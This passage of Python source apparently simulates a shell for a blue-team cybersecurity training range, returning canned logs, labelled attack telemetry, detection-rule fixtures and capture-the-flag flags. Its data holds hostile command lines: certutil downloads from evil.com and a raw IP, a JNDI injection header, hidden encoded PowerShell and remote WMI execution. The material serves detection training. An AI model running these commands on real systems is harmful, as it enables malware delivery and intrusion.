                    '    "parent_process": "winword.exe",\n'
                    '    "label": "ATTACK_MALICIOUS_OFFICE_SPAWN"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "process_name": "cmd.exe",\n'
                    '    "command_line": "cmd.exe /c whoami /priv",\n'
                    '    "user": "CORP\\\\devuser",\n'
                    '    "parent_process": "vscode.exe",\n'
                    '    "label": "BENIGN_DEVELOPER_QUERY"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "process_name": "certutil.exe",\n'
                    '    "command_line": "certutil.exe -urlcache -split -f http://198.51.100.4/beacon.bin C:\\\\temp\\\\b.bin",\n'
                    '    "user": "CORP\\\\victim1",\n'
                    '    "parent_process": "explorer.exe",\n'
                    '    "label": "ATTACK_CERTUTIL_DOWNLOAD"\n'
                    '  }\n'
                    ']\n'
                )
            if "threshold_baseline_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T10:00:00Z",\n'
                    '    "user": "svc_sql",\n'
                    '    "src_ip": "10.0.1.15",\n'
                    '    "auth_status": "SUCCESS",\n'
                    '    "hourly_mean": 2.1,\n'
                    '    "window_count": 2,\n'
                    '    "label": "BENIGN_SERVICE_ACCOUNT_AUTH"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T10:05:00Z",\n'
                    '    "user": "admin",\n'
                    '    "src_ip": "192.168.1.100",\n'
                    '    "auth_status": "FAILURE",\n'
                    '    "hourly_mean": 1.4,\n'
                    '    "window_count": 1,\n'
                    '    "label": "BENIGN_USER_TYPO"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T10:08:00Z",\n'
                    '    "user": "finance01",\n'
                    '    "src_ip": "10.0.2.45",\n'
                    '    "auth_status": "FAILURE",\n'
                    '    "hourly_mean": 1.2,\n'
                    '    "window_count": 87,\n'
                    '    "anomaly_flag": "THRESHOLD_EXCEEDED",\n'
                    '    "z_score": 6.8,\n'
                    '    "mitre_technique": "T1110.003",\n'
                    '    "label": "ATTACK_PASSWORD_SPRAY_SPIKE"\n'
                    '  },\n'
                    '  {\n'
                    '    "timestamp": "2026-11-15T10:12:00Z",\n'
                    '    "user": "devops_lead",\n'
                    '    "src_ip": "10.0.3.12",\n'
                    '    "auth_status": "SUCCESS",\n'
                    '    "hourly_mean": 4.5,\n'
                    '    "window_count": 5,\n'
                    '    "label": "BENIGN_DEVELOPER_AUTH"\n'
                    '  }\n'
                    ']\n'
                )
            if "multi_event_correlation_stream" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "stage": 1,\n'
                    '    "telemetry": "email_gateway",\n'
                    '    "event": "phishing_attachment_delivered",\n'
                    '    "recipient": "victim@corp.local",\n'
                    '    "filename": "Invoice_Q3.docm",\n'
                    '    "host": "WS-0941",\n'
                    '    "timestamp": "2026-11-15T11:00:10Z",\n'
                    '    "mitre_technique": "T1566.001",\n'
                    '    "label": "ATTACK_SPEARPHISHING_ATTACHMENT"\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": 2,\n'
                    '    "telemetry": "edr_sysmon_1",\n'
                    '    "event": "process_creation",\n'
                    '    "process": "powershell.exe",\n'
                    '    "parent_process": "winword.exe",\n'
                    '    "command_line": "powershell.exe -ep bypass -nop -w hidden -enc JABjAGwAaQ...",\n'
                    '    "host": "WS-0941",\n'
                    '    "timestamp": "2026-11-15T11:00:45Z",\n'
                    '    "mitre_technique": "T1059.001",\n'
                    '    "label": "ATTACK_MACRO_EXECUTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "stage": 3,\n'
                    '    "telemetry": "network_zeek",\n'
                    '    "event": "outbound_connection",\n'
                    '    "dest_ip": "198.51.100.89",\n'
                    '    "dest_port": 4444,\n'
                    '    "host": "WS-0941",\n'
                    '    "timestamp": "2026-11-15T11:01:05Z",\n'
                    '    "mitre_technique": "T1071.001",\n'
                    '    "label": "ATTACK_C2_BEACON"\n'
                    '  }\n'
                    ']\n'
                )
            if "synthetic_test_fixtures" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "id": "FIX-POS-01",\n'
                    '    "type": "positive",\n'
                    '    "description": "Obfuscated PowerShell invocation from Office document",\n'
                    '    "log": {\n'
                    '      "event_id": 1,\n'
                    '      "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",\n'
                    '      "command_line": "powershell.exe -enc SQBFAFgA...",\n'
                    '      "parent_image": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\winword.exe"\n'
                    '    },\n'
                    '    "expected_result": "MATCH"\n'
                    '  },\n'
                    '  {\n'
                    '    "id": "FIX-POS-02",\n'
                    '    "type": "positive",\n'
                    '    "description": "LOLBIN Certutil web file transfer",\n'
                    '    "log": {\n'
                    '      "event_id": 1,\n'
                    '      "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",\n'
                    '      "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe C:\\\\temp\\\\x.exe"\n'
                    '    },\n'
                    '    "expected_result": "MATCH"\n'
                    '  },\n'
                    '  {\n'
                    '    "id": "FIX-NEG-01",\n'
                    '    "type": "negative",\n'
                    '    "description": "Legitimate developer git command line",\n'
                    '    "log": {\n'
                    '      "event_id": 1,\n'
                    '      "image": "C:\\\\Program Files\\\\Git\\\\bin\\\\git.exe",\n'
                    '      "command_line": "git.exe status",\n'
                    '      "parent_image": "C:\\\\Windows\\\\explorer.exe"\n'
                    '    },\n'
                    '    "expected_result": "NO_MATCH"\n'
                    '  },\n'
                    '  {\n'
                    '    "id": "FIX-NEG-02",\n'
                    '    "type": "negative",\n'
                    '    "description": "Legitimate maintenance command prompt",\n'
                    '    "log": {\n'
                    '      "event_id": 1,\n'
                    '      "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",\n'
                    '      "command_line": "cmd.exe /c echo hello",\n'
                    '      "parent_image": "C:\\\\Windows\\\\System32\\\\services.exe"\n'
                    '    },\n'
                    '    "expected_result": "NO_MATCH"\n'
                    '  }\n'
                    ']\n'
                )
            if "yara_target_memory_samples" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "pid": 3812,\n'
                    '    "process": "svchost.exe",\n'
                    '    "allocated_region": "0x00400000 - 0x00450000",\n'
                    '    "hex_preview": "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00",\n'
                    '    "extracted_strings": [\n'
                    '      "VirtualAlloc",\n'
                    '      "WriteProcessMemory",\n'
                    '      "CreateRemoteThread",\n'
                    '      "cmd.exe /c echo beaconing"\n'
                    '    ],\n'
                    '    "section_entropy": 7.82,\n'
                    '    "classification": "SUSPICIOUS_REFLECTIVE_DLL",\n'
                    '    "label": "ATTACK_MEMORY_INJECTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "pid": 1104,\n'
                    '    "process": "explorer.exe",\n'
                    '    "allocated_region": "0x7FF60000 - 0x7FF90000",\n'
                    '    "hex_preview": "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00",\n'
                    '    "extracted_strings": [\n'
                    '      "ShellExecuteExW",\n'
                    '      "GetCommandLineW",\n'
                    '      "CreateWindowExW"\n'
                    '    ],\n'
                    '    "section_entropy": 5.12,\n'
                    '    "classification": "BENIGN_SYSTEM_PE",\n'
                    '    "label": "BENIGN_OS_BINARY"\n'
                    '  }\n'
                    ']\n'
                )
            if "suricata_network_events" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "packet_id": 90141,\n'
                    '    "timestamp": "2026-11-15T13:00:01Z",\n'
                    '    "proto": "TCP",\n'
                    '    "src_ip": "192.168.1.105",\n'
                    '    "src_port": 49812,\n'
                    '    "dst_ip": "198.51.100.22",\n'
                    '    "dst_port": 80,\n'
                    '    "flow": "to_server,established",\n'
                    '    "http_uri": "/api/v1/auth",\n'
                    '    "payload_snippet": "POST /api/v1/auth HTTP/1.1\\r\\nUser-Agent: ${jndi:ldap://evil.internal/a}\\r\\n",\n'
                    '    "mitre_technique": "T1071.001",\n'
                    '    "label": "ATTACK_JNDI_INJECTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "packet_id": 90142,\n'
                    '    "timestamp": "2026-11-15T13:00:05Z",\n'
                    '    "proto": "TCP",\n'
                    '    "src_ip": "10.0.1.12",\n'
                    '    "src_port": 50114,\n'
                    '    "dst_ip": "10.0.1.1",\n'
                    '    "dst_port": 443,\n'
                    '    "flow": "to_server,established",\n'
                    '    "http_uri": "/health",\n'
                    '    "payload_snippet": "GET /health HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\n",\n'
                    '    "label": "BENIGN_INTERNAL_HEALTH_CHECK"\n'
                    '  }\n'
                    ']\n'
                )
            if "threat_hunting_corpus" in target_file:
                return (
                    '[\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "timestamp": "2026-11-15T14:00:10Z",\n'
                    '    "process": "wmic.exe",\n'
                    '    "command_line": "wmic.exe /node:10.0.1.50 process call create \'powershell.exe -enc JABj...\'",\n'
                    '    "parent_process": "cmd.exe",\n'
                    '    "user": "CORP\\\\compromised_admin",\n'
                    '    "host_count": 1,\n'
                    '    "mitre_technique": "T1047",\n'
                    '    "label": "ATTACK_REMOTE_WMI_EXECUTION"\n'
                    '  },\n'
                    '  {\n'
                    '    "event_id": 1,\n'
                    '    "timestamp": "2026-11-15T14:00:20Z",\n'
                    '    "process": "wmic.exe",\n'
                    '    "command_line": "wmic.exe OS get Caption,OSArchitecture",\n'
                    '    "parent_process": "SCCM_Client.exe",\n'
                    '    "user": "NT AUTHORITY\\\\SYSTEM",\n'
                    '    "host_count": 850,\n'
                    '    "label": "BENIGN_SCCM_INVENTORY_QUERY"\n'
                    '  }\n'
                    ']\n'
                )
            if "ci_cd_pipeline_definition" in target_file:
                return (
                    '{\n'
                    '  "pipeline_name": "detection-as-code-ci-cd",\n'
                    '  "version_control": "GitLab CI / GitHub Actions",\n'
                    '  "stages": [\n'
                    '    "lint",\n'
                    '    "test",\n'
                    '    "security-review",\n'
                    '    "deploy"\n'
                    '  ],\n'
                    '  "rules_in_pipeline": [\n'
                    '    {\n'
                    '      "rule_id": "sigma-proc-01",\n'
                    '      "name": "PowerShell Encoded Download",\n'
                    '      "format": "Sigma YAML v2.0",\n'
                    '      "mitre_technique": "T1195.002",\n'
                    '      "target_backends": ["Elasticsearch", "Splunk", "Wazuh"]\n'
                    '    },\n'
                    '    {\n'
                    '      "rule_id": "sigma-proc-02",\n'
                    '      "name": "Certutil LOLBIN Web Request",\n'
                    '      "format": "Sigma YAML v2.0",\n'
                    '      "target_backends": ["Elasticsearch", "Splunk", "Wazuh"]\n'
                    '    }\n'
                    '  ],\n'
                    '  "status": "PIPELINE_STAGES_LOADED"\n'
                    '}\n'
                )
            if "capstone_enterprise_pipeline" in target_file:
                return (
                    '{\n'
                    '  "enterprise_grid": "VoltCorp Global SOC Infrastructure",\n'
                    '  "threat_scenario": "Adversary LSASS Credential Access & Multi-Stage Lateral Movement",\n'
                    '  "mitre_technique": "T1003.001",\n'
                    '  "active_layers": [\n'
                    '    {\n'
                    '      "layer": 1,\n'
                    '      "type": "Network Intrusion (Suricata)",\n'
                    '      "monitored_subnets": 12,\n'
                    '      "active_rules": 420\n'
                    '    },\n'
                    '    {\n'
                    '      "layer": 2,\n'
                    '      "type": "Host Behavioral (Sigma / EDR)",\n'
                    '      "monitored_hosts": 1250,\n'
                    '      "active_rules": 185\n'
                    '    },\n'
                    '    {\n'
                    '      "layer": 3,\n'
                    '      "type": "Memory & File Hunting (YARA)",\n'
                    '      "scanned_endpoints": 1250,\n'
                    '      "active_rules": 64\n'
                    '    },\n'
                    '    {\n'
                    '      "layer": 4,\n'
                    '      "type": "Correlation & Alerting (SIEM)",\n'
                    '      "correlation_chains": 18,\n'
                    '      "status": "SYNCHRONIZED"\n'
                    '    }\n'
                    '  ],\n'
                    '  "status": "ENTERPRISE_PIPELINE_ONLINE"\n'
                    '}\n'
                )
            if "auth.log" in target_file or "secure" in target_file or "/var/log" in target_file:
                return (
                    "Nov 14 08:14:10 target sshd[1041]: Failed password for invalid user admin from 192.0.2.144 port 41202 ssh2\n"
                    "Nov 14 08:14:12 target sshd[1042]: Failed password for root from 192.0.2.144 port 41204 ssh2\n"
                    "Nov 14 08:14:15 target sshd[1045]: Accepted password for operator from 192.0.2.144 port 41210 ssh2\n"
                    "Nov 14 08:14:20 target sshd[1046]: SECURITY_AUDIT: SSH brute force identified from 192.0.2.144\n"
                    "Nov 14 08:16:01 target sudo: operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/usr/bin/python3 -c import socket...\n"
                )
            return f"cat: {target_file}: No such file or directory\n"

        # 4. Permissions (chmod) & Script Execution
        if cmd.startswith("chmod "):
            return ""
        if "restricted_script.sh" in cmd:
            return "[+] Execution verified! Security token: NOENTRY{linux_chmod_execution_unlocked_9104}\n"
        if "privesc_audit.sh" in cmd:
            return (
                "=== NO ENTRY PRIVILEGE ESCALATION AUDIT ===\n"
                "[*] Current Identity:\n"
                "uid=1000(operator) gid=1000(operator) groups=1000(operator)\n\n"
                "[*] Sudo Permissions check (sudo -l):\n"
                "User operator may run the following commands on target:\n"
                "    (root) NOPASSWD: /usr/bin/find\n\n"
                "[*] SUID Binaries search (find / -perm -4000):\n"
                "/usr/bin/passwd\n"
                "/usr/local/bin/backup_helper\n"
            )
        if "ad_ldap_query.py" in cmd:
            return (
                "[*] Base: DC=corp,DC=noentry,DC=local\n"
                "User: Administrator   OU: IT Admins            SPN: NONE\n"
                "User: krbtgt          OU: Domain Controllers   SPN: NONE\n"
                "User: svc_sql         OU: Service Accounts     SPN: MSSQLSvc/db01.corp.noentry.local:1433\n"
                "User: svc_backup      OU: Service Accounts     SPN: BackupSvc/backup01.corp.noentry.local\n"
                "User: jdoe            OU: Workstations         SPN: NONE\n"
                "User: alovelace       OU: IT Admins            SPN: NONE\n"
                "[+] Flag: NOENTRY{ad_ldap_enumeration_spn_7812}\n"
            )
        if "exploit_runner.py" in cmd:
            return (
                "[+] Foothold: Low-privilege session established\n"
                "[*] Session ID: sess_post_99182\n"
                "[+] Flag: NOENTRY{exploit_initial_foothold_access_6120}\n"
            )
        if "soc_query" in cmd:
            return (
                "[*] VoltDefense SIEM Event Stream Query\n"
                "Total events: 4\n"
                "Correlated Event EVT-1003: AUTH_BURST_FAILURE from 198.51.100.42\n"
            )
        if "parse_evtx" in cmd:
            return (
                "[*] Parsing Windows Security Events...\n"
                "Discovered Event ID 4624 (LogonType 10 - RemoteInteractive) from 10.10.14.2\n"
                "Discovered Event ID 4720: Account 'backdoor_admin' created\n"
            )
        if "investigate_win_events" in cmd:
            return (
                "=== WINDOWS SECURITY EVENT INVESTIGATION ===\n"
                "2026-11-14T11:15:30Z   4688     svc_admin          powershell.exe -enc SQBFAFgA...\n"
                "2026-11-14T11:15:32Z   4104     N/A                IEX (New-Object Net.WebClient).DownloadString...\n"
                "2026-11-14T11:20:00Z   4732     Administrators     Member added: backdoor_admin\n"
                "2026-11-14T11:42:01Z   1102     Administrator      The audit log was cleared\n"
            )
        if "siem_query" in cmd:
            if "alerts" in cmd:
                return (
                    "=== VOLTDEFENSE SIEM ACTIVE CORRELATED ALERTS ===\n"
                    "[ALRT-701] Rule: RULE_BRUTE_FORCE_EXFIL | Severity: CRITICAL | Source: 198.51.100.77\n"
                    "Description: Correlated pattern: Consecutive high-severity authentication failures followed by massive outbound egress.\n"
                    "MITRE Technique: T1048 - Exfiltration Over Alternative Protocol\n"
                )
            return (
                "{\n"
                '  "status": "SEARCH_RESULTS",\n'
                '  "total_hits": 4,\n'
                '  "results": [\n'
                '    {"id": "SIEM-001", "event_type": "TCP_DROP", "src_ip": "198.51.100.77", "severity": "MEDIUM"},\n'
                '    {"id": "SIEM-002", "event_type": "AUTH_FAILURE", "src_ip": "198.51.100.77", "severity": "HIGH"},\n'
                '    {"id": "SIEM-004", "event_type": "EGRESS_SPIKE", "src_ip": "10.10.14.90", "dst_ip": "198.51.100.77", "severity": "CRITICAL"}\n'
                "  ]\n"
                "}\n"
            )
        if "tcpdump" in cmd:
            return (
                "reading from file /home/operator/pcaps/incident_capture.pcap, link-type EN10MB (Ethernet)\n"
                "08:00:01.100000 IP 10.10.14.2.44812 > 10.10.14.90.80: Flags [P.], seq 101:136, ack 501, length 35: HTTP: user=admin&password=VoltSecret9921!\n"
                "08:00:01.102000 IP 10.10.14.2.53212 > 10.10.14.90.53: 1+ A? exfil-chunk-data.corp.noentry.internal.\n"
                "240 packets captured\n"
            )
        if "tshark" in cmd:
            if "nids_traffic" in cmd:
                return (
                    "  1 0.000000 198.51.100.99 -> 10.10.14.90 TCP 60 41201 > 21 [SYN] Seq=0 Win=1024\n"
                    "  2 0.000010 198.51.100.99 -> 10.10.14.90 TCP 60 41202 > 22 [SYN] Seq=0 Win=1024\n"
                    "  3 0.000020 198.51.100.99 -> 10.10.14.90 TCP 60 41203 > 80 [SYN] Seq=0 Win=1024\n"
                    "  4 0.000030 198.51.100.99 -> 10.10.14.90 TCP 60 41204 > 443 [SYN] Seq=0 Win=1024\n"
                    "  5 0.000040 198.51.100.99 -> 10.10.14.90 TCP 60 41205 > 8080 [SYN] Seq=0 Win=1024\n"
                    "  6 0.000050 198.51.100.99 -> 10.10.14.90 TCP 60 41206 > 8443 [SYN] Seq=0 Win=1024\n"
                    "  7 15.000000 10.10.20.15 -> 203.0.113.88 TCP 128 50112 > 8443 [PSH, ACK] Seq=1 Ack=1\n"
                )
            return (
                "  1 0.000000    10.10.14.2 -> 10.10.14.90   TCP 74 51420 > 80 [SYN] Seq=0 Win=8192\n"
                "  2 0.000100    10.10.14.90 -> 10.10.14.2   TCP 74 80 > 51420 [SYN, ACK] Seq=0 Ack=1\n"
                "  3 0.000200    10.10.14.2 -> 10.10.14.90   TCP 54 51420 > 80 [ACK] Seq=1 Ack=1\n"
                "  4 0.001000    10.10.14.2 -> 10.10.14.90   HTTP 142 POST /api/v1/telemetry HTTP/1.1\n"
                "  5 0.002000    10.10.14.2 -> 10.10.14.90   DNS 78 Standard query 0x5a5a A c2-beacon.corp.noentry.internal\n"
            )
        if "detect_bruteforce" in cmd:
            return (
                "=== AUTHENTICATION ANOMALY DETECTION ===\n"
                "Source IP Analysis:\n"
                "  IP: 198.51.100.55    Failures: 12   Unique Users Targeted: 12   Pattern: PASSWORD_SPRAY (T1110.003)\n"
                "  IP: 203.0.113.19     Failures: 8    Unique Users Targeted: 1    Pattern: DICTIONARY_BRUTEFORCE (T1110.001)\n"
            )
        if "yara_scanner" in cmd:
            return (
                "=== YARA STATIC STRING SCANNER: /home/operator/samples/dropper_sample.bin ===\n"
                "File Size: 14336 bytes\n"
                "  [+] Signature Match: VoltStage2_Payload\n"
                "  [+] Signature Match: http://c2-stage.voltcorp.internal/gate.php\n"
                "  [+] Signature Match: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
                "Total Signature Matches: 3/3\n"
                "[!] VERDICT: High-Confidence Malicious Dropper Staging Artifact\n"
            )
        if "inspect_email" in cmd:
            return (
                "=== PHISHING EMAIL HEADER INSPECTOR ===\n"
                "From:        Chief Information Security Officer <ciso@voltcorp.internal>\n"
                "Return-Path: <attacker-spoof@v0ltcorp.internal>\n"
                "Reply-To:    security-update@v0ltcorp.internal\n"
                "Subject:     URGENT: Executive Security Certificate & SSO Re-authentication Required\n"
                "Auth-Results:mx01.voltcorp.internal; spf=fail; dkim=none; dmarc=fail\n"
                "[!] LOOKALIKE DOMAIN DETECTED: 'v0ltcorp.internal' (typosquatted digit '0' for letter 'o')\n"
                "[!] SPF FAILURE: Sender IP is not authorized by the legitimate domain's SPF record\n"
                "[!] DMARC FAILURE: Header alignment check failed; domain impersonation confirmed\n"
            )
        if "edr_query" in cmd:
            return (
                "=== VOLTDEFENSE EDR PROCESS TREE QUERY ===\n"
                "PID      PPID     Name             User           Details\n"
                "--------------------------------------------------------------------------------\n"
                "4        0        System           SYSTEM         \n"
                "680      4        services.exe     SYSTEM         \n"
                "1120     680      explorer.exe     CORP\\jdoe      \n"
                "1204     1120     winword.exe      CORP\\jdoe      \"C:\\Program Files\\...\\invoice_q3.docx\"\n"
                "4812     1204     powershell.exe   CORP\\jdoe      10.10.14.50:49210 -> 198.51.100.88:443\n"
                "  [!] ALERT: LOLBIN abuse detected! winword.exe (Word) spawned hidden powershell.exe!\n"
                "  [!] Remote C2 Connection: 10.10.14.50:49210 -> 198.51.100.88:443\n"
            )
        if "inspect_nids" in cmd:
            if "--scan" in cmd:
                return (
                    "=== NIDS RECONNAISSANCE ANALYSIS ===\n"
                    "Source IP: 198.51.100.99 (External Adversary)\n"
                    "Scan Type: Stealth TCP Half-Open SYN Scan (MITRE T1046)\n"
                    "Targeted Ports: 21, 22, 80, 443, 8080, 8443\n"
                    "Target Asset: 10.10.14.90 (DMZ Perimeter Gateway)\n"
                )
            if "--beacon" in cmd:
                return (
                    "=== NIDS COVERT BEACON ANALYSIS ===\n"
                    "Origin: 10.10.20.15:50112 (Internal Host DB-PROD-01)\n"
                    "Destination: 203.0.113.88:8443 (External Adversary C2 Infrastructure)\n"
                    "Beacon Interval: 15.0 seconds (Jitter: 0%)\n"
                    "Payload Signature: HEARTBEAT_V2_CHECKIN (MITRE T1071.001)\n"
                )
            return (
                "=== VOLTDEFENSE NIDS SENSOR OVERVIEW ===\n"
                "Sensor Interface: eth0-span | Monitored VLAN: 20\n"
                "Alerts Generated: 2 | High-Confidence Threats: Port Scan (198.51.100.99), Outbound Beacon (203.0.113.88)\n"
            )
        if "hunt_query" in cmd:
            if "winword" in cmd or "--parent" in cmd:
                return (
                    "=== THREAT HUNTING: LOLBIN SPAWNING ANALYSIS ===\n"
                    "Parent Process: WINWORD.EXE (PID 2110) [User: VOLTCORP\\alovelace]\n"
                    "Spawned Child:  powershell.exe (PID 4820)\n"
                    "Command Line:   powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjADIAIAA9...\n"
                    "MITRE Technique: T1059.001 - Command and Scripting Interpreter: PowerShell\n"
                )
            if "--persistence" in cmd:
                return (
                    "=== THREAT HUNTING: SCHEDULED TASK PERSISTENCE ===\n"
                    "Task Name: TelemetrySync\n"
                    "Task Path: \\Microsoft\\Windows\\AppID\\TelemetrySync\n"
                    "Trigger:   AtLogon (All Users)\n"
                    "Action:    powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc JABjADIAIAA9...\n"
                    "MITRE Technique: T1053.005 - Scheduled Task/Job\n"
                )
            return (
                "=== THREAT HUNTING HYPOTHESES ===\n"
                "1. HYP-T1059.001: Macro execution spawning PowerShell LOLBIN\n"
                "2. HYP-T1053.005: Hidden Scheduled Task Persistence in AppID path\n"
            )
        if "triage_tool" in cmd:
            if "ALT-8820" in cmd or "--alert" in cmd:
                return (
                    "=== SOC INCIDENT TRIAGE: ALERT ALT-8820 ===\n"
                    "Target Asset: DB-PROD-01 (10.10.20.15) [Tier 1 Production Database]\n"
                    "Severity:     CRITICAL\n"
                    "Classification: TRUE_POSITIVE (Active Data Exfiltration)\n"
                    "Compromised Account: svc_db_sync\n"
                    "Exfiltration Target: 198.51.100.77 (External SFTP Port 22)\n"
                    "Data Volume:         ~2400 MB (425,000 customer PII records)\n"
                )
            if "--list" in cmd:
                return (
                    "=== SOC ACTIVE ALERT TRIAGE QUEUE ===\n"
                    "ALT-8819 | LOW      | WEB-STAGING-02 | FALSE_POSITIVE (Authorized Qualys Scan)\n"
                    "ALT-8820 | CRITICAL | DB-PROD-01     | TRUE_POSITIVE (Database Exfiltration)\n"
                    "ALT-8821 | INFO     | BACKUP-VAULT-01| BENIGN (Nightly Backup Verification)\n"
                )
            return "Usage: triage_tool.py [--list | --alert <ALERT_ID>]\n"
        if "ir_manager" in cmd:
            if "--status" in cmd:
                return (
                    "=== INCIDENT RESPONSE OPERATIONS: IR-2026-088 ===\n"
                    "Standard: NIST SP 800-61 Rev 2\n"
                    "Compromised Host: DB-PROD-01 (10.10.20.15)\n"
                    "Active C2 Socket: 10.10.20.15:49152 -> 198.51.100.77:443\n"
                    "Malicious Backdoor PID: 3912 (win_updater.exe)\n"
                    "Persistence Service: svc_winupdater\n"
                    "Compromised Principal: svc_db_sync (Token: ST-VOLT-9921)\n"
                )
            if "--evidence" in cmd:
                return (
                    "=== FORENSIC EVIDENCE PRESERVATION (RFC 3227) ===\n"
                    "[1] Volatile RAM: WinPmem dump acquired (SHA-256: 7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123)\n"
                    "[2] Active Sockets: 10.10.20.15:49152 -> 198.51.100.77:443 (PID 3912)\n"
                    "[3] Persistence: svc_winupdater -> C:\\Windows\\Temp\\win_updater.exe\n"
                )
            return "Usage: ir_manager.py [--status | --evidence]\n"
        # Blue Team Room 17: Digital Forensics
        if "sha256sum" in cmd:
            if "evidence_artifact.bin" in cmd:
                return "34049ea3151168bea705f416fabb3c8919ba7563ad650cff2af6e1b7745fc465  /var/log/forensics/evidence_artifact.bin\n"
            return "34049ea3151168bea705f416fabb3c8919ba7563ad650cff2af6e1b7745fc465  evidence.bin\n"
        if "forensics_tool" in cmd:
            if "--hash" in cmd:
                return (
                    "=== EVIDENCE HASH INTEGRITY REPORT (RFC 3227) ===\n"
                    "Target Artifact: /var/log/forensics/evidence_artifact.bin\n"
                    "File Size: 101 bytes\n"
                    "MD5:    5f4dcc3b5aa765d61d8327deb882cf99\n"
                    "SHA256: 34049ea3151168bea705f416fabb3c8919ba7563ad650cff2af6e1b7745fc465\n"
                )
            if "--timeline" in cmd or "--mft" in cmd:
                return (
                    "=== FORENSIC MACB TIMELINE RECONSTRUCTION ===\n"
                    "[2026-11-15T09:00:01Z] Initial suspicious outbound socket connection to 198.51.100.77:443 (Source: Network/EDR)\n"
                    "[2026-11-15T09:10:14Z] PowerShell execution of dropper payload (T1059.001) (Source: Process Tree / PID 3912)\n"
                    "[2026-11-15T09:12:00Z] Unauthorized staging directory creation C:\\Users\\Public\\Temp_Exfil [Inode: 89104] (Source: NTFS MFT Record 89104)\n"
                    "[2026-11-15T09:14:22Z] Data collection and archive creation inside Temp_Exfil (Source: Filesystem MACB Metadata)\n"
                )
            return "Usage: forensics_tool.py [--hash | --timeline | --mft]\n"
        # Blue Team Room 18: System Hardening
        if "hardening_audit" in cmd:
            if "--linux" in cmd:
                return (
                    "=== LINUX SYSTEM HARDENING POSTURE AUDIT ===\n"
                    "[*] SSH Daemon Configuration (/home/operator/hardening/sshd_config.audit):\n"
                    "    Protocol 2\n"
                    "    Port 22\n"
                    "    PermitRootLogin yes\n"
                    "    PasswordAuthentication yes\n"
                    "    PubkeyAuthentication yes\n"
                    "    MaxAuthTries 10\n"
                    "[*] Sudoers Privileges (/home/operator/hardening/sudoers.audit):\n"
                    "    root ALL=(ALL:ALL) ALL\n"
                    "    operator ALL=(ALL:ALL) NOPASSWD: ALL\n"
                )
            if "--windows" in cmd:
                return (
                    "=== WINDOWS CIS BENCHMARK POSTURE AUDIT ===\n"
                    "[*] AccountLockoutThreshold: 0 (Insecure - Lockout Disabled)\n"
                    "[*] PowerShell ExecutionPolicy: Unrestricted (Insecure)\n"
                    "[*] SMBv1 Protocol: Enabled (Insecure)\n"
                )
            return "Usage: hardening_audit.py [--linux | --windows]\n"
        # Blue Team Room 19: Threat Intelligence
        if "intel_tool" in cmd:
            if "--iocs" in cmd:
                return (
                    "=== CYBER THREAT INTELLIGENCE (CTI) IOC FEED ===\n"
                    "[IPv4] 198.51.100.77 | Context: Active C2 Server | Actor: APT-VOLT-VIPER | Confidence: High\n"
                    "[Domain] update-cdn.voltcorp-support.internal | Context: C2 Domain | Actor: APT-VOLT-VIPER | Confidence: High\n"
                    "[SHA-256] 34049ea3151168bea705f416fabb3c8919ba7563ad650cff2af6e1b7745fc465 | Context: VoltDrop Dropper Binary | Actor: APT-VOLT-VIPER | Confidence: High\n"
                    "[MITRE-ATT&CK] T1566.001 | Context: Initial Access: Spearphishing Attachment | Actor: APT-VOLT-VIPER | Confidence: High\n"
                    "[MITRE-ATT&CK] T1059.001 | Context: Execution: PowerShell Cmdlet Obfuscation | Actor: APT-VOLT-VIPER | Confidence: High\n"
                )
            if "--attck" in cmd:
                return (
                    "=== MITRE ATT&CK ENTERPRISE MAPPING ===\n"
                    "[*] Technique ID: T1566.001 - Spearphishing Attachment\n"
                    "[*] Technique ID: T1059.001 - PowerShell Execution\n"
                )
            return "Usage: intel_tool.py [--iocs | --attck]\n"
        # Blue Team Room 20: Capstone
        if "capstone_investigator" in cmd:
            if "--detect" in cmd:
                return (
                    "=== CAPSTONE STAGE 1 & 2: INTRUSION DETECTION ===\n"
                    "Incident Case: CAPSTONE-IR-FINAL [Severity: CRITICAL]\n"
                    "Compromised Host: DB-PROD-01 (10.10.20.15)\n"
                    "External Adversary IP: 198.51.100.77\n"
                )
            if "--hunt" in cmd:
                return (
                    "=== CAPSTONE STAGE 3: ADVERSARY THREAT HUNTING ===\n"
                    "Malicious Spawned PID: 3912\n"
                    "Persistence Service:  svc_winupdater\n"
                    "Payload Binary:       C:\\Windows\\Temp\\win_updater.exe\n"
                    "MITRE ATT&CK Technique: T1059.001 (PowerShell Execution)\n"
                )
            if "--forensics" in cmd:
                return (
                    "=== CAPSTONE STAGE 4: FORENSIC EVIDENCE PRESERVATION ===\n"
                    "Volatile RAM Artifact Hash (SHA-256): 7a35b1d9821811faec2984b2382903487f54921b72a912e84c980312fa890123\n"
                    "Integrity Status: VERIFIED UNCOMPROMISED\n"
                )
            if "--intel" in cmd or "--triage" in cmd:
                return (
